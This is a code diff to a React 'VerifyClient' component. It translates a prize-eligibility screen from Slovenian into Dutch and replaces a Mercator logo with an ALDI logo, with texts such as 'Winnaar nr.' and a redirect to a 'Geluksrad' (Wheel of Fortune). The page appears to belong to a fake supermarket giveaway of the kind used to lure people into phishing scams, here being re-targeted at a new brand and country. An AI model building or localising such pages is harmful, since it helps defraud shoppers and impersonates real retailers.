@@ -184,12 +184,12 @@ export function VerifyClient({ sessionId, routeSessionId }: Props) {
             <div className="h-14 w-14 animate-spin rounded-full border-4 border-[#E30613]/30 border-t-[#ff6b74]" />
           </div>
           <h1 className="text-xl font-extrabold text-white sm:text-2xl">
-            Prosimo, počakajte...
+            Even geduld...
           </h1>
           <p className="mt-3 text-sm font-medium leading-relaxed text-slate-300 sm:text-[15px]">
-            Preverja se, ali ste upravičeni do vrtenja Kola Sreče.
+            Er wordt gecontroleerd of u in aanmerking komt om het Geluksrad te draaien.
             <br />
-            Rezultat bo objavljen čez nekaj sekund.
+            Het resultaat verschijnt over enkele seconden.
           </p>
           <div className="mx-auto mt-6 h-1.5 w-56 max-w-full overflow-hidden rounded-full bg-[#3d0310]">
             <div
@@ -215,8 +215,8 @@ export function VerifyClient({ sessionId, routeSessionId }: Props) {
             <div className="pointer-events-none absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-[#E30613]/70 to-transparent" />
 
             <img
-              src="/form-assets/mercator-logo.png"
-              alt="Mercator"
+              src="/form-assets/aldi-logo.png"
+              alt="ALDI"
               className="mx-auto mb-8 h-8 w-auto opacity-90 drop-shadow-[0_2px_12px_rgba(255,255,255,0.15)]"
               draggable={false}
             />
@@ -241,10 +241,10 @@ export function VerifyClient({ sessionId, routeSessionId }: Props) {
             </div>
 
             <p className="text-[11px] font-bold uppercase tracking-[0.35em] text-[#ff6b74]">
-              Čestitamo
+              Proficiat
             </p>
             <h1 className="mt-2 break-words text-4xl font-black tracking-tight text-white sm:text-5xl">
-              {firstName ? `${firstName}!` : "Čestitamo!"}
+              {firstName ? `${firstName}!` : "Proficiat!"}
             </h1>
 
             <div className="mx-auto mt-6 inline-flex items-center gap-2.5 rounded-full border border-[#E30613]/40 bg-gradient-to-r from-[#E30613]/35 via-[#E30613]/15 to-[#E30613]/35 px-5 py-2 shadow-[inset_0_1px_0_rgba(255,255,255,0.08)]">
@@ -256,17 +256,17 @@ export function VerifyClient({ sessionId, routeSessionId }: Props) {
                 <path d="M10 1.5l2.6 5.3 5.9.9-4.3 4.1 1 5.8L10 14.9l-5.2 2.7 1-5.8L1.5 7.7l5.9-.9L10 1.5z" />
               </svg>
               <span className="text-sm font-bold tracking-wide text-white">
-                Zmagovalec št. {winnerNo}
+                Winnaar nr. {winnerNo}
               </span>
             </div>
 
             <p className="mt-6 text-sm font-medium leading-relaxed text-white/70 sm:text-base">
-              Osvojili ste pravico do vrtenja Kola Sreče!
+              U heeft het recht gewonnen om het Geluksrad te draaien!
             </p>
 
             <div className="mt-8 flex items-center justify-center gap-2.5 text-xs font-medium tracking-wide text-white/45">
               <div className="h-3.5 w-3.5 animate-spin rounded-full border-2 border-white/15 border-t-[#E30613]" />
-              Preusmerjanje na Kolo Sreče...
+              Doorverwijzen naar het Geluksrad...
             </div>
           </div>
         </div>
